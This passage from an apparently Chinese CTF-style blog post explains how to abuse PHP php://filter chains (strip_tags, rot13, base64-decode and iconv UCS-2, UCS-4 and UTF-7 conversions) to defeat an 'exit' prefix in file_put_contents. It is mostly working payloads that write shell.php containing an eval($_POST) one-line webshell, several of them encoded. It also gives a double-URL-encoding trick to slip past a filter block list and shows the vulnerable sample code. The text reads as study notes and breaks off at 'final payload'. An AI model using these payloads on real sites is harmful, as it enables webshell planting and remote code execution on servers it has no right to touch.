+<p><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240522172738818.png" alt="image-20240522172738818"></p>
+<p>注意：这里虽然说是php7.3.0后废除，但是看了看网上在线的php官方文档&#x3D;&#x3D;直到php8.0还没有完全废弃</p>
+<p>使用此过滤器等同于用<a href="https://www.php.net/manual/zh/function.strip-tags.php">strip_tags()函数</a>处理所有的流数据，官网文档函数说明：<br><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240521145500302.png" alt="image-20240521145500302"></p>
+<p>这里的标签包含诸如<code>&lt;html&gt;</code>、**<code>&lt;haha</code>**或者<code>&lt;?</code>等标志都会被去除掉，测试一下</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">这里用函数<span class="title function_ invoke__">strip_tags</span>()来演示：</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">strip_tags</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="number">1</span>.</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;&lt;ha&gt;haha&lt;/aher&gt;&#x27;</span>;</span><br><span class="line"><span class="comment">#结果：haha</span></span><br><span class="line"><span class="number">2</span>.</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;&lt;htmlhahaha-flag=&#123;adgaiudgiuag&#125;&gt;&#x27;</span>;</span><br><span class="line"><span class="comment">#结果：全部被删除了，这是因为虽然不是一个标准的HTML标签，但任然符合标签格式，所以都被当做了html标签被删除</span></span><br><span class="line"><span class="number">3</span>.</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;&lt;htmlhahaha-flag=&#123;adgaiudgiuag&#125;&#x27;</span>;</span><br><span class="line"><span class="comment">#结果：全部被删除了</span></span><br><span class="line"><span class="number">4</span>.</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;&lt; htmlhahaha-flag=&#123;adgaiudgiuag&#125;&gt;&#x27;</span>;</span><br><span class="line"><span class="comment">#结果：&lt; htmlhahaha-flag=&#123;adgaiudgiuag&#125;</span></span><br><span class="line"><span class="number">5</span>.</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;&lt;htmlhahaha-flag=&#123;adgaiudgiuag&#125; &gt;&#x27;</span></span><br><span class="line"><span class="comment">#结果：全删</span></span><br><span class="line"><span class="number">6</span>.</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;&lt;?php htmlhahaha-flag=&#123;adgaiudgiuag&#125;?&gt;&#x27;</span></span><br><span class="line"><span class="comment">#结果：全部被删除，php元素应该是会全部被删除</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>说明一下区别：</strong></p>
+<ul>
+<li><p>2和3区别： 为什么<code>&lt;haha</code>也会全部被删除，这是因为当调用<code>strip_tags()</code>时，它会执行以下操作，</p>
+<p>（1）它会从左到右扫描字符串，找到第一个<code>&lt;</code>，</p>
+<p>（2）继续扫描直到找到<code>&gt;</code>，<strong>在此过程中，所有字符都被认为是标签的一部分</strong>。</p>
+<p>（3）移除标签：将<code>&lt;</code>和<code>&gt;</code>之间的所有内容删除。</p>
+</li>
+<li><p>2与3区别：</p>
+</li>
+<li></li>
+</ul>
+<p>清晰明了。</p>
+<ul>
+<li><p>4和5区别：空格位置不同导致结果也不同，这就有html中的标签和属性有关了，首先，标签名称不能包含空格，但是标签属性部分可以包含空格，如下：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://example.com&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span>Visit Example<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>则在这里:</p>
+<p>（1）<code>&lt;a&gt;</code>是标签名称，表示一个超链接元素，</p>
+<p>（2）<code>href=&quot;https://example.com&quot;</code> 是一个属性，指定链接的目标 URL。</p>
+<p>（3）<code>target=&quot;_blank&quot;</code> 是另一个属性，指定链接打开的方</p>
+</li>
+</ul>
+<p>所以标签名称前面是不能有空格的，后面有没有无所谓，就算有空格都只是被当做标签名称与属性分隔的地方。</p>
+<p><strong>这里一定要注意：</strong></p>
+<ul>
+<li><p><code>&lt;</code>对应<code>&gt;</code>代表结束，<code>&lt;?</code>一定要有<code>?&gt;</code>才代表结束</p>
+</li>
+<li><p>php元素（<code>&lt;?</code>）没有前面必须没有空格的说法，只要是这在这两个相对应的符号之间的内容全部都会被去除</p>
+</li>
+</ul>
+<h6 id="convert-iconv"><a href="#convert-iconv" class="headerlink" title="convert.iconv.*:"></a>convert.iconv.*:</h6><p>这个过滤器需要<code>php</code>支持<code>iconv</code>。而<code>iconv</code>是默认编译的。使用<code>convert.iconv.*</code>过滤器等同于用<code>iconv()</code>函数处理所有的流数据。</p>
+<p><code>iconv</code>——将字符串按要求的字符编码来转换</p>
+<p><code>convert.iconv.*</code>有两种使用方法：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">convert.iconv.&lt;input-encoding&gt;.&lt;output-encoding&gt;</span><br><span class="line"><span class="keyword">or</span></span><br><span class="line">convert.iconv.&lt;input-encoding&gt;/&lt;output-encoding&gt;</span><br></pre></td></tr></table></figure>
+
+<p>可用的字符编码：（其他可参考<a href="https://www.php.net/manual/en/mbstring.supported-encodings.php">官方手册</a>）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UCS-4*</span><br><span class="line">UCS-4BE</span><br><span class="line">UCS-4LE*</span><br><span class="line">UCS-2</span><br><span class="line">UCS-2BE</span><br><span class="line">UCS-2LE</span><br><span class="line">UTF-32*</span><br><span class="line">UTF-32BE*</span><br><span class="line">UTF-32LE*</span><br><span class="line">UTF-16*</span><br><span class="line">UTF-16BE*</span><br><span class="line">UTF-16LE*</span><br><span class="line">UTF-7</span><br><span class="line">UTF7-IMAP</span><br><span class="line">UTF-8*</span><br><span class="line">ASCII*</span><br></pre></td></tr></table></figure>
+
+<p>等如压缩过滤器的其他过滤器的利用可以自己去看</p>
+<h6 id="小绕过"><a href="#小绕过" class="headerlink" title="小绕过"></a>小绕过</h6><p>比如有的时候会对过滤器进行过滤，如下：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/iconv|UCS|UTF|rot|quoted|base64/i&#x27;</span>,<span class="variable">$content</span>))</span><br><span class="line">         <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>); </span><br></pre></td></tr></table></figure>
+
+<p><strong>此时有个小知识点</strong>：伪协议处理时会对过滤器<code>urldecode</code>过滤一次。</p>
+<p>所以可以利用二次编码绕过，比如：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/write=string.%7%32ot13|&lt;?cuc cucvasb();?&gt;|/resource=w0s1np.php</span><br></pre></td></tr></table></figure>
+
+<p>可以直接在burp上使用<code>URL-encode all characters</code>对其进行URL全编码,主要是要将字符也编码。</p>
+<p>并且在自己的搭建的环境也成功测试。</p>
+<h3 id="利用编码解码来’模糊’代码"><a href="#利用编码解码来’模糊’代码" class="headerlink" title="利用编码解码来’模糊’代码"></a>利用编码解码来’模糊’代码</h3><p>这里以文件包含的<code>死亡exit()</code>绕过为例子，比如有下面的代码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$content</span> = <span class="string">&#x27;&lt;?php exit; ?&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$content</span> .= <span class="variable">$_POST</span>[<span class="string">&#x27;txt&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>], <span class="variable">$content</span>);</span><br></pre></td></tr></table></figure>
+
+<p><code>$content</code>在开头增加了exit过程，导致即使我们成功写入一句话，也执行不了（这个过程在实战中十分常见，通常出现在缓存、配置文件等等地方，不允许用户直接访问的文件，都会被加上if(!defined(xxx))exit;之类的限制）。</p>
+<p>但是注意，<code>file_put_content()</code>函数是可以使用php:&#x2F;&#x2F;filter，同时这里的<code>$_POST[&#39;filename&#39;]</code>是可以被控制为传入的参数为伪协议的，那么我们就可以在这里尝试做文章。</p>
+<p>思路：只要将<code>content</code>前面部分的那段代码使用某种手段（编码等）进行处理，导致<code>php</code>不能识别该部分就行，这里的<code>$_POST[&#39;filename&#39;]</code>是可以控制协议的。</p>
+<h4 id="利用base64编码"><a href="#利用base64编码" class="headerlink" title="利用base64编码"></a>利用base64编码</h4><p>使用<code>php://filter</code>流的base64-decode方法，将<code>$content</code>解码，利用php base64_decode函数特性去除“死亡exit”。</p>
+<p><strong>核心原理</strong>：Base64编码中只包含64个可打印字符，而PHP在解码Base64时，遇到不在其中的字符时，将会跳过这些字符，键将合法字符组成一个进的字符串进行解码。</p>
+<p>所以，一个正常的<code>base64_decode</code>实际上可以理解为如下两个步骤。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;txt&#x27;</span>] = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;|[^a-z0-9A-Z+/]|s&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;txt&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;txt&#x27;</span>]);</span><br></pre></td></tr></table></figure>
+
+<p>所以，当<code>$content</code>被加上了<code>&lt;?php  exit; ?&gt;</code>以后，当使用<code>php://filter/write=convert.base64-decode</code>对其解码，<strong>在解码的过程中，字符<code>&lt;</code>、<code>?</code>、<code>;</code>、<code>&gt;</code>、<code>空格</code>等字符会因为不符合base64编码的字符范围被忽略，所以最终被解码的字符仅有<code>phpexit</code>和我们传入的其他字符。</strong></p>
+<p><code>phpexit</code>一共7个字符，因为base64算法解码时是4个byte一组，所以给他增加一个”a”一共8个字符。这样，<code>phpexita</code>被正常解码，而后面我们传入的webshell的base64内容页被正常解码，结果就是<code>&lt;?php exit;?&gt;</code>没有了。</p>
+<p><strong>最后效果</strong></p>
+<p>成功写入：</p>
+<p><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240521191114493.png" alt="image-20240521191114493"></p>
+<p>成功执行：<br><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240521191420996.png" alt="image-20240521191420996"></p>
+<h4 id="利用rot13编码"><a href="#利用rot13编码" class="headerlink" title="利用rot13编码"></a>利用rot13编码</h4><p><strong>条件</strong>：<code>short_open_tag = off</code>,即不开启短标签（也许默认为On，自己的配置就是）</p>
+<p>原理和上面类似，核心是将“死亡exit”去除，<code>&lt;?php exit; ?&gt;</code>在经过rot13编码后会变成<code>&lt;?cuc rkvg; ?&gt;</code>，在不开启<code>short_open_tag</code>时，php不认识这个字符串，当然也就不会执行。</p>
+<p><strong>最后效果</strong></p>
+<p>成功写入：</p>
+<p><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240521194945000.png" alt="image-20240521194945000"></p>
+<p>成功执行：<br><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240521195044746.png" alt="image-20240521195044746"></p>
+<p><strong>同时经测试，将条件改为On，不能执行。</strong></p>
+<h4 id="利用字符串操作方法"><a href="#利用字符串操作方法" class="headerlink" title="利用字符串操作方法"></a>利用字符串操作方法</h4><p>这里就需要用到上面阐述过的<code>string.strip_tags</code>，在测试代码中：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$content</span> = <span class="string">&#x27;&lt;?php exit; ?&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$content</span> .= <span class="variable">$_POST</span>[<span class="string">&#x27;txt&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>], <span class="variable">$content</span>);</span><br></pre></td></tr></table></figure>
+
+<p>可以看到<code>&lt;?php exit; ?&gt;</code>实际上是一个XML标签，既然是XML标签，就可以利用<code>strip_tags</code>函数去除它，而<code>php://filter</code>是支持这个方法的，</p>
+<p>已经阐述过<code>string.strip_tags</code>过滤器会过滤的东西，那么我们可以直接尝试这样构造</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">filename=php:<span class="comment">//filter/write=string.strip_tags|convert.base64-decode/resource=12.txt&amp;txt=PD9waHAgcGhwaW5mbygpOyA/Pg==</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#为了防止想传入的数据也被去除掉，所以这里也将内容编码一下</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>最后效果</strong></p>
+<p>成功写入：<br><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240521201629726.png" alt="image-20240521201629726"></p>
+<p>成功执行：<br><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240521201701528.png" alt="image-20240521201701528"></p>
+<p><strong>这个方法的做题记录：</strong><br>写入：</p>
+<p><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240521202558001.png" alt="image-20240521202558001"></p>
+<p>利用：<br><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240521202621401.png" alt="image-20240521202621401"></p>
+<h4 id="代码变形bypass"><a href="#代码变形bypass" class="headerlink" title="代码变形bypass"></a>代码变形bypass</h4><p>对于这个板块的代码可利用的有三种，总结一下(注意融汇贯通，比如下面的<code>convert.iconv*</code>也许也能用于起亚抢矿，注重思考)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">第一种情况，就是上面说的那种：</span><br><span class="line">file_put_contents($_POST[&#x27;filename&#x27;],&quot;&lt;?php exit();&quot;.$_POST[&#x27;content&#x27;]); </span><br><span class="line"></span><br><span class="line">第二种：相同变量</span><br><span class="line">$content = $GET[&#x27;content&#x27;];</span><br><span class="line">file_put_contents($content,&#x27;&lt;?php exit;&#x27;.$content);</span><br><span class="line"></span><br><span class="line">第三种</span><br></pre></td></tr></table></figure>
+
+<p>第一种情况已经在上面已经有比较清楚的说明，先在来说说第二种情况。</p>
+<h5 id="bypass相同变量"><a href="#bypass相同变量" class="headerlink" title="bypass相同变量"></a>bypass相同变量</h5><p>这里对应第二种情况，bypass的方法如下</p>
+<h6 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h6><p><strong>首先有个知识点：</strong><code>=</code>在base64中的作用是填充，也就是意味着结束；在<code>=</code>的后面是不允许有其他任何字符的，否则会报错，并且这样会导致无法正常写入文件的。测试一下：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;php://filter/convert.base64-decode/resource=2.txt&#x27;</span>,<span class="string">&#x27;PD9waHAgcGhwaW5mbygpOz8+=.php&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>运行过后没有写入文件，2.txt文件为空。再改一下代码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;php://filter/convert.base64-decode/resource=2.txt&#x27;</span>,<span class="string">&#x27;PD9waHAgcGhwaW5mbygpOz8+.php&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>成功向2.txt文件写入东西</p>
+<p><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240522131121762.png" alt="image-20240522131121762"></p>
+<p>确实存在这个问题，<strong>需要注意</strong></p>
+<p>——————</p>
+<p>常规可想到的payload</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php:<span class="comment">//filter/convert.base64-decode/resource=PD9waHAgcGhwaW5mbygpOz8+.php</span></span><br></pre></td></tr></table></figure>
+
+<p><code>content</code>拼接过后的内容为：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">exit</span>();php:<span class="comment">//filter/convert.base64-decode/resource=PD9waHAgcGhwaW5mbygpOz8+.php</span></span><br></pre></td></tr></table></figure>
+
+<p>此时就有一个问题<strong>，<code>=</code>的问题</strong>，需要使用一个方法将其去掉这里考虑<code>string.strip_tags</code>过滤器，如下构造：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php:<span class="comment">//filter/string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8%2b</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">#注意，这里需要将&#x27;+&#x27;URL编码为%2B,防止被浏览器当做空格处理</span></span><br></pre></td></tr></table></figure>
+
+<p>此时拼接后的语句可以**配合到php前后对应的标签被去除只剩下<code>PD9waHAgcGhwaW5mbygpOz8+.php</code>**，再被base64解码形成想要执行的字符串并填入到文件中，如下测试代码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;php://filter/string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8%2B.php&#x27;</span>,<span class="string">&#x27;&lt;?php exit;php://filter/string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8%2B.php&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>成功执行（生成了一个文件，文件名为<code>?&gt;PD9waHAgcGhwaW5mbygpOz8%2b.php</code>，但是没有内容），估计是系统问题</p>
+<p>但是由于文件名不正常，想读就必须加上引号，但是在浏览器访问的时候访问不到看（引号问题），不好读，这里可以尝试将其改变为一个正常的文件名，这里采用<strong>伪目录的方法</strong>（这里将<code>resource</code>后面前面的base64字符和闭合的符号整体看做一个目录，但是由于没有这个目录，于是就撤回到了原目录，可以生成我们能够访问的文件名），于是构建如下payload:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php:<span class="comment">//filter/string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8%2B/../haha.php</span></span><br></pre></td></tr></table></figure>
+
+<p>这样可以构建出haha.php，文件，内容为<code>&lt;?php phpinfo();?&gt;</code>，原理我是get到了，但是本地搭没测试出来，怪，等有题的时候再试试。</p>
+<h6 id="rot13绕过"><a href="#rot13绕过" class="headerlink" title="rot13绕过"></a>rot13绕过</h6><p>首先rot13编码不受限于<code>=</code>,并且条件同样为之前那个（<code>short_open_tag = off</code>），这样才不会被PHP识别为代码。</p>
+<p>payload：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">content=php:<span class="comment">//filter/write=string.rot13|&lt;?cuc cucvasb();?&gt;|/resource=shell.php</span></span><br><span class="line"></span><br><span class="line">content=php:<span class="comment">//filter/write=string.rot13/resource=&lt;?cuc cucvasb();?&gt;/../shell.php</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>对于第一个payload个人理解（重要，后面对于这种构造方法利用的比较多）</strong>：第一个payload将我们想要利用的字符串放进了了过滤器列表里面，个人猜测是php程序在运行这串代码时会找有没有这个过滤器，没有就直接跳过舍弃。</p>
+<p>测试一下：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">测试代码：</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$content</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;x&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$content</span>,<span class="string">&#x27;&lt;?php exit;&#x27;</span>.<span class="variable">$content</span>);</span><br><span class="line">传入的payload:</span><br><span class="line">php:<span class="comment">//filter/write=string.rot13|&lt;?cuc cucvasb();?&gt;|/resource=erqie.php</span></span><br><span class="line"> 拼接完后即是：</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">exit</span>;php:<span class="comment">//filter/write=string.rot13|&lt;?cuc cucvasb();?&gt;|/resource=erqie.php</span></span><br></pre></td></tr></table></figure>
+
+<p>最终结果：<br>成功写入：</p>
+<p><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240522194848128.png" alt="image-20240522194848128"></p>
+<p>成功执行：<br><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240522194907522.png" alt="image-20240522194907522"></p>
+<h6 id="convert-iconv-1"><a href="#convert-iconv-1" class="headerlink" title="convert.iconv.*"></a>convert.iconv.*</h6><p>对于<code>iconv</code>字符编码转换进行绕过的手法，类似于上面所述的<code>rot13</code>方法，都是先对原有字符串进行某种编码然后再解码，这个过程导致最初的限制<code>exit;</code>去除，而我们的恶意代码正常解码存储。（注意：不出意外的话应该是只有类似”同族“的编码方式才能这样转换）</p>
+<ul>
+<li><strong>usc-2</strong></li>
+</ul>
+<p>通过UCS-2方式，对目标字符串进行2位一反转（这里的2LE和2BE可以看作是小端和大端的列子），<strong>也就是说构造的恶意代码的字节数需要是UCS-2中2的倍数</strong>，不然不能进行正常反转</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">iconv</span>(<span class="string">&quot;UCS-2LE&quot;</span>,<span class="string">&quot;UCS-2BE&quot;</span>,<span class="string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>);</span><br><span class="line"><span class="comment"># ?&lt;hp phpipfn(o;)&gt;? 从转换结果就可以看出来是如何转换的，为什么要是2的倍数 同时注意包裹要转换的字符串必须是单引号</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[x]); <span class="meta">?&gt;</span> <span class="comment">#一句话木马</span></span><br><span class="line"><span class="comment">#?&lt;hp pe@av(l_$OPTSx[)] ;&gt;?</span></span><br></pre></td></tr></table></figure>
+
+<p>payload(其实都差不多了感觉):</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/convert.iconv.UCS-2LE.UCS-2BE|?&lt;hp pe@av(l_$OPTSx[)] ;&gt;?/resource=shell.php</span><br></pre></td></tr></table></figure>
+
+<p>最后效果：</p>
+<p>成功写入：</p>
+<p><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240522201457636.png" alt="image-20240522201457636"></p>
+<p>成功利用：<br><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240522201556443.png" alt="image-20240522201556443"></p>
+<ul>
+<li><strong>usc-4</strong></li>
+</ul>
+<p>这个和上面那个差不多的，只不过这个是对目标字符串进行4位以反转(这里的4LE和4BE可以看作是小端和大端的列子），也就是说目标字符串的字节需要为4的倍数，简单说说：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">iconv</span>(<span class="string">&quot;UCS-4LE&quot;</span>,<span class="string">&quot;UCS-4BE&quot;</span>,<span class="string">&#x27;&lt;?php @eval($_POST[x12]); ?&gt;&#x27;</span>);</span><br><span class="line"><span class="comment">#hp?&lt;e@ p(lavOP_$x[TS)]21&gt;? ;</span></span><br></pre></td></tr></table></figure>
+
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/write=convert.iconv.UCS-4LE.UCS-4BE|hp?&lt;e@ p(lavOP_$x[TS)]21&gt;? ;/resource=shell.php</span><br></pre></td></tr></table></figure>
+
+<p>最终效果：</p>
+<p>写入：</p>
+<p><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240522202744151.png" alt="image-20240522202744151"></p>
+<p>利用：</p>
+<p><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240522202830720.png" alt="image-20240522202830720"></p>
+<ul>
+<li>utf8-utf7</li>
+</ul>
+<p>这个方法就与上面两个不同了，由于utf-8与utf-7在编码转换时只对符号进行编码，不对字符编码。如下：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">iconv</span>(<span class="string">&quot;utf-8&quot;</span>,<span class="string">&quot;utf-7&quot;</span>,<span class="string">&#x27;&lt;?php @eval($_POST[x12]); ?&gt;&#x27;</span>);</span><br><span class="line"><span class="comment">#+ADw?php +AEA-eval(+ACQAXw-POST+AFs-x12+AF0)+ADs ?+AD4-   可以看出字符都被留下来了，并且在像上面方法那样利用转换并不能成功，可以自己试试</span></span><br></pre></td></tr></table></figure>
+
+<p>但是注意这个：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">iconv</span>(<span class="string">&quot;utf-8&quot;</span>,<span class="string">&quot;utf-7&quot;</span>,<span class="string">&#x27;=&#x27;</span>);</span><br><span class="line"><span class="comment">#+AD0- 并且刚好是四个字节，可以被base64解码掉</span></span><br></pre></td></tr></table></figure>
+
+<p>这个编码把<code>=</code>给过滤了，这时候就可以想到结合上面将的Base64编码使用，</p>
+<p>这是就要注意到之间说过的4个为一个单位来将前面的<code>phpexit</code>去掉，但是这里不一样，需要将传入的字符前面所有都为四个字节为一组，先看简单构造出来的payload:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php:<span class="comment">//filter/write=XXXPD9waHAgQGV2YWwoJF9QT1NUWyd4J10pOz8+|convert.iconv.utf-8.utf-7|convert.base64-decode/resource=shell.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#PD9waHAgQGV2YWwoJF9QT1NUWyd4J10pOz8+  ： &lt;?php @eval($_POST[&#x27;x&#x27;]);?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>此时我们就需要想如何使得前面的能够为4个一组，操作点就在<code>XXX</code>那里，写一个php代码看看前面的在过滤后还剩什么：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$c</span>=<span class="string">&#x27;&lt;?php exit;php://filter/write=&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">iconv</span>(<span class="string">&quot;utf-8&quot;</span>,<span class="string">&quot;utf-7&quot;</span>,<span class="variable">$c</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>.PHP_EOL;</span><br><span class="line"><span class="variable">$ga</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;|[^a-z0-9A-Z+/]|s&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$ga</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line">+ADw?php <span class="keyword">exit</span>+ADs-php:<span class="comment">//filter/write+AD0-</span></span><br><span class="line"></span><br><span class="line">+ADwphpexit+ADsphp<span class="comment">//filter/write+AD0</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment">#第二个字符串就是我们最终会被base64解码的字符串，这里刚好有36个字节，所以不用往前面加东西-即不用加X</span></span><br></pre></td></tr></table></figure>
+
+<p>最终payload:</p>
